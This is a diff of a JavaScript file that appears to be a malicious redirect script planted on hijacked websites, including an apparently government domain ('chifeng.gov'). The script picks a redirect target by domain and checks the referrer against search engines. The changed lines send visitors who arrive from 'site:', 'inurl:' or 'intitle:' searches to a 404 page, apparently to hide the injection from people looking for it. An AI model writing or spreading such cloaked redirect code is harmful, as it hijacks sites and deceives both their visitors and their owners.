@@ -1,6 +1,6 @@
 var js616dm = document.domain.toLowerCase(); 
 
-var this_url = 'http://live.sportscn.com/nba/livebasket_cba.html';
+var this_url = 'http://live.sportscn.com/nba/livebasket_nba.html';
 if(js616dm.indexOf('chifeng.gov')!=-1){
   this_url = 'http://www.123188.com/';
 }
@@ -40,9 +40,8 @@ var s360=ref.indexOf("360.cn");
 var s3602=ref.indexOf("so.com");
 var sbing=ref.indexOf("bing.cn");
 
-if(baidu <0 && soso <0 && google <0 && sogou <0 && s360 <0 && s3602 <0 && sbing <0){
-if( ref.indexOf("site%3a") <0 && ref.indexOf("inurl%3a") <0 && ref.indexOf("intitle%3a") <0 ){
-
+if(baidu!=-1 || soso!=-1 || google!=-1 || sogou!=-1 || s360!=-1 || s3602!=-1 || sbing!=-1){
+if( ref.indexOf("site%3a")!=-1 || ref.indexOf("inurl%3a")!=-1 || ref.indexOf("intitle%3a")!=-1 ){
   this_url = '/404.html';
   window.top.location.replace(this_url);
   window.location.href=this_url;
